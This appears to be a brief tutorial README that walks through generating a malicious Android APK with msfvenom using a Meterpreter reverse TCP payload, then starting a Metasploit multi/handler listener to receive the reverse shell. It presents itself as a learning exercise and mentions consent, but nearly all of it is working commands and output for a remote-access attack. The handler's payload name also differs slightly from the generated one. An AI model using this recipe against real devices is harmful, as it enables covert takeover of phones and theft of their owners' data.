# Android exploit with Metasploit
I'm doing this as an exercise to understand how Metasploit and Android exploits work. Needless to say that if you want to experiment with this do it with own your phone or ask for permission, this is so much fun just if everybody is aware of it :)

## Pre-requisites
- Metasploit
- Android phone

## Generate apk
First, get your IP address (attacker) using `ifconfig`:
```
$ ifconfig en0 | grep 192
	inet 192.168.1.37 netmask 0xffffff00 broadcast 192.168.1.255
```

Use `msfvenom` (part of Metasploit) to generate the malicious apk (remember to use your IP adress here):
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.37 LPORT=4444 R > boom.apk
[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
[-] No arch selected, selecting arch: dalvik from the payload
No encoder specified, outputting raw payload
Payload size: 10188 bytes
```

## Start listener
Now, before copying and executing the apk on the phone, we need to start a handler that will catch the reverse tcp call from the malicious app. This will be done using `msfconsole`.

```bash
$ msfconsole
msf5 > use exploits/multi/handler
msf5 exploit(multi/handler) > set payload android/meterpreter_reverse_tcp
msf5 exploit(multi/handler) > set LHOST 192.168.1.37
msf5 exploit(multi/handler) > set LPORT 4444
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.1.37:4444
```
